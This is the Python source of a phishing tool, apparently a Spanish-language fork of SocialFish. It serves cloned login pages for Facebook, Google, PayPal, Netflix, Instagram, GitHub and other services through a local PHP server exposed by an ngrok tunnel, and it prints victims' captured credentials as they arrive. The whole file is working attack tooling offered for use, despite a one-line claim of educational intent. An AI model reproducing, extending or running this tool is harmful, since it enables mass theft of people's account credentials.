#-*- coding: utf-8 -*-
#       SOCIALFISH
#     by: UNDEADSEC
#
###########################
from time import sleep
from sys import stdout, exit
from os import system, path
import multiprocessing
from urllib import urlopen
from platform import system as systemos, architecture
from wget import download

RED, WHITE, CYAN, GREEN, END = '\033[91m', '\33[46m', '\033[36m', '\033[1;32m', '\033[0m'

def connected(host='http://duckduckgo.com'):
    try:
        urlopen(host)
        return True
    except:
        return False
if connected() == False:
     print '''
             ___ _ __ _ __ ___  _ __  | || |  / _ \| || |  
            / _ \ '__| '__/ _ \| '__| | || |_| | | | || |_ 
           |  __/ |  | | | (_) | |    |__   _| |_| |__   _|
            \___|_|  |_|  \___/|_|       |_|  \___/   |_|  
                                                 
                    {0}[{1}!{0}]{1} Error en el internet. verifica tu coneccion.\n
'''.format(RED, END)
     exit(0)

def checkNgrok():
    if path.isfile('Server/ngrok') == False: 
        print '[*] Downloading Ngrok...'
        if architecture()[0] == '64bit':
            filename = 'ngrok-stable-linux-arm.zip'
        else:
            filename = 'ngrok-stable-linux-arm.zip'
        url = 'https://bin.equinox.io/c/4VmDzA7iaHb/' + filename
        download(url)
        system('unzip ' + filename)
        system('mv ngrok Server/ngrok')
        system('rm -Rf ' + filename)
        system('clear')
checkNgrok()


def end():
    system('clear')
    print '''
        
             ``                   ``              
           ``      S O C I A L{2}                 ``            
          -h-`                        -           
          dMMy     `::`     ```      :N-          
         `MMMm`.:+shMNy+-./ohNd+:.` /NM/          
         .MMMmdNMMMMMMMh/-yMMMMMMNdsyMM+          
         `NMM+yMMMMMMMm/+o:dMMMMMMMNoNM+          
          yMm`-dNMNNmNNMMMMdhmNMMMm/`dM+          
          +MN-``:++/oNMMMMMMh/+oo/-``hM/          
          `dMm/::hmNMMNMMMMMMNmho-../hm`          
         ` /MMMMNmMMMmdmmmmmNMMNNNmmMM: `         
    `-+ydmo.dMMMMMMmhy/---:ohdNMMMMMMm:hmhs/-     
./shmNMMMMMd+dMMMMMms-.-.-..:hmMMMMMddNMMMMMNdy+: 
:hNMMMMMMMMMNNMMNMMNo-.-----/dNMNNMMNMMMMMMMMMMNs 
 -sMMMMMmyys+dMMNmMNNhyo+oydNmhNmNNMsoyyyNMMMMN+` 
  :dNs::o.`:dNMMNNmNmhhyyhyyydmNNMMMNy.`:o:/hMo-  
   +do-.ym+NMMMMd.`:mNmmddmNNs.`/MMMMMhsN/`/hh.   
    -ddmMMNNMMMMM/ :hMMMMMMMNs. hMMMMMdMMNdds     
     ..yMMMMMMMMd+ -mMMMdNMMMs``yNMMMMMMMM-.      
       .mMMMdy/.    :yso-/oyy`   `-ohNMMMs`       
       `+y+.           ```           `-sy:        
                  {1}ERROR 404{2}                            
                                         ~--___--~

{1}[ {0}Dedicado para el grupo de Error404 ]
{1}[ {0}Este script esta hecho con fines eduacativos ]
[ {0}Siguenos en nuestra Paginas de Facebook Youtube Twitter Instagram ]\n'''.format(GREEN, END, CYAN)

def loadModule(module):
       print '''{0}
   (_) __ ___   _(_) ___ 
   | |/ _` \ \ / / |/ __|
   | | (_| |\ V /| | (__ 
  _/ |\__,_| \_/ |_|\___|
 |__/                    
 [{1}*{0}]{1} %s cargando modulo. Construyendo el sitio...{0}'''.format(RED, END) % module

def runPhishing(social, option2):
    system('sudo rm -Rf Server/www/*.* && touch Server/www/cat.txt')
    if option2 == '1' and social == 'Facebook':
        system('cp WebPages/facebook_login/*.* Server/www/')
    if option2 == '2' and social == 'Facebook':
        system('cp WebPages/error404/*.* Server/www/')
    if option2 == '3' and social == 'Facebook':
        system('cp WebPages/team_whoami/*.* Server/www/')
    elif option2 == '1' and social == 'Google':
        system('cp WebPages/google/*.* Server/www/')   
    elif social == 'LinkedIn':
        system('cp WebPages/linkedin/*.* Server/www/')
    elif social == 'Github':
        system('cp WebPages/github/*.* Server/www/')
    elif social == 'StackOverflow':
        system('cp WebPages/stackoverflow/*.* Server/www/')
    elif social == 'WordPress':
        system('cp WebPages/wordpress/*.* Server/www/')
    elif social == 'Twitter':
        system('cp WebPages/twitter/*.* Server/www/')
    elif social == 'Snapchat':
        system('cp WebPages/snapchat/*.* Server/www/')
    elif social == 'Paypal':
        system('cp WebPages/paypal/*.* Server/www/')
    elif social == 'Netflix':
        system('cp WebPages/netflix/*.* Server/www/')
    elif social == 'Instagram':
        system('cp WebPages/instagram/*.* Server/www/')
    elif social == 'PlayStation':
        system('cp WebPages/psnetwork/*.* Server/www/')

def waitCreds():
    print " {0}[{1}*{0}]{1} Esperando nuestra vicitma... \n".format(GREEN, END)
    while True:
        with open('Server/www/cat.txt') as creds:
            lines = creds.read().rstrip()
        if len(lines) != 0: 
            print ' {0}[ CREDENCIALES OBTENIDAS]{1}:\n {0}%s{1}'.format(GREEN, END) % lines
            system('rm -rf Server/www/cat.txt && touch Server/www/cat.txt')
        creds.close()

def runPEnv():
    system('clear')
    print '''{2}-{1} ERROR404{2}|{1} JAVIC {2}|{1} youtube.com/error404notfound          {2}- ECUADOR
      
               ```            ````                
             ``                   ``              
           ``      S O C I A L{2}                 ``            
          -h-`                        -           
          dMMy     `::`     ```      :N-          
         `MMMm`.:+shMNy+-./ohNd+:.` /NM/          
         .MMMmdNMMMMMMMh/-yMMMMMMNdsyMM+          
         `NMM+yMMMMMMMm/+o:dMMMMMMMNoNM+          
          yMm`-dNMNNmNNMMMMdhmNMMMm/`dM+          
          +MN-``:++/oNMMMMMMh/+oo/-``hM/          
          `dMm/::hmNMMNMMMMMMNmho-../hm`          
         ` /MMMMNmMMMmdmmmmmNMMNNNmmMM: `         
    `-+ydmo.dMMMMMMmhy/---:ohdNMMMMMMm:hmhs/-     
./shmNMMMMMd+dMMMMMms-.-.-..:hmMMMMMddNMMMMMNdy+: 
:hNMMMMMMMMMNNMMNMMNo-.-----/dNMNNMMNMMMMMMMMMMNs 
 -sMMMMMmyys+dMMNmMNNhyo+oydNmhNmNNMsoyyyNMMMMN+` 
  :dNs::o.`:dNMMNNmNmhhyyhyyydmNNMMMNy.`:o:/hMo-  
   +do-.ym+NMMMMd.`:mNmmddmNNs.`/MMMMMhsN/`/hh.   
    -ddmMMNNMMMMM/ :hMMMMMMMNs. hMMMMMdMMNdds     
     ..yMMMMMMMMd+ -mMMMdNMMMs``yNMMMMMMMM-.      
       .mMMMdy/.    :yso-/oyy`   `-ohNMMMs`       
       `+y+.           ```           `-sy:        
                  {1}ERROR 404{2}             
                              | |    \   | |  
      -_)   _| _| _ \   _|   __ _| (  | __ _| 
    \___| _| _| \___/ _|       _| \__/    _|  
                                           
                             {1}'''.format(GREEN, END, CYAN)

    for i in range(101):
        sleep(0.01)
        stdout.write("\r{0}[{1}*{0}]{1} Preparando el Entorno... %d%%".format(CYAN, END) % i)
        stdout.flush()
   
    print "\n\n{0}[{1}*{0}]{1} Searching for PHP installation... ".format(CYAN, END) 
    if 256 != system('which php'):
        print " --{0}>{1} OK.".format(CYAN, END)
    else:
	print " --{0}>{1} PHP NOT FOUND: \n {0}*{1} Please install PHP and run me again. http://www.php.net/".format(RED, END)
        exit(0)
    if raw_input(" {0}[{1}!{0}]{1} Estas seguro que quieres continuar? (y/n)\n {2}SF > {1}".format(RED, END, CYAN)).upper() != 'Y':
        system('clear')
        print '\n[ {0}TO NO ESTAS AUTORIZADO A UTILIZAR ESTA TOOL1} ]\n'.format(RED, END)
        exit(0)
    option = raw_input("\nSelect an option:\n\n {0}[{1}1{0}]{1} Facebook\n {0}[{1}2{0}]{1} Google\n {0}[{1}3{0}]{1} Paypal \n {0}[{1}4{0}]{1} Twitter\n {0}[{1}5{0}]{1} Snapchat \n {0}[{1}6{0}]{1} Instagram \n {0}[{1}7{0}]{1} Netflix \n {0}[{1}8{0}]{1} Github\n {0}[{1}9{0}]{1} LinkedIn\n {0}[{1}10{0}]{1} StackOverflow\n {0}[{1}11{0}]{1} WordPress\n {0}[{1}12{0}]{1} PlayStation\n {0}SF >  {1}".format(CYAN, END))
    if option == '1':
        loadModule('Facebook')
        option2 = raw_input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Facebook login\n\n {0}[{1}2{0}]{1} Pagina Error404 con login\n\n {0}[{1}3{0}]{1} Pagina Team Whoami con login\n\n {0}SF > {1}".format(CYAN, END))
        runPhishing('Facebook', option2)
    elif option == '2':
        loadModule('Google')
        option2 = raw_input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Google Inicio\n\n {0}SF > {1}".format(CYAN, END))
        runPhishing('Google', option2)
    elif option == '3':
        loadModule('Paypal')
        option2 = ''
        runPhishing('Paypal', option2)
    elif option == '4':
        loadModule('Twitter')
        option2 = ''
        runPhishing('Twitter', option2)
    elif option == '5':
        loadModule('Snapchat')
        option2 = ''
        runPhishing('Snapchat', option2)
    elif option == '6':
        loadModule('Instagram')
        option2 = ''
        runPhishing('Instagram', option2)
    elif option == '7':
        loadModule('Netflix')
        option2 = ''
        runPhishing('Netflix', option2)
    elif option == '8':
        loadModule('Github')
        option2 = ''
        runPhishing('Github', option2)
    elif option == '9':
        loadModule('LinkedIn')
        option2 = ''
        runPhishing('LinkedIn', option2)
    elif option == '10':
        loadModule('StackOverflow')
        option2 = ''
        runPhishing('StackOverflow', option2)
    elif option == '11':
        loadModule('WordPress')
        option2 = ''
        runPhishing('WordPress', option2)
    elif option == '12':
        loadModule('PlayStation')
        option2 = ''
        runPhishing('PlayStation', option2)
    else:
        exit(0)

def runNgrok():
    system('./Server/ngrok http 8080 > /dev/null &')
    sleep(10)
    system('curl -s http://127.0.0.1:4040/status | grep -P "https://.*?ngrok.io" -oh > ngrok.url')
    url = open('ngrok.url', 'r')
    print('\n {0}[{1}*{0}]{1} Ngrok URL: {2}' + url.readlines()[0] + '{1}').format(CYAN, END, GREEN)
    url.close()

def runServer():
    system("cd Server/www/ && php -S 127.0.0.1:8080")

if __name__ == "__main__":
    try:
        runPEnv()
        runNgrok()
        multiprocessing.Process(target=runServer).start()
        waitCreds()
    except KeyboardInterrupt:
        system('pkill -f ngrok')
        end()
        exit(0)
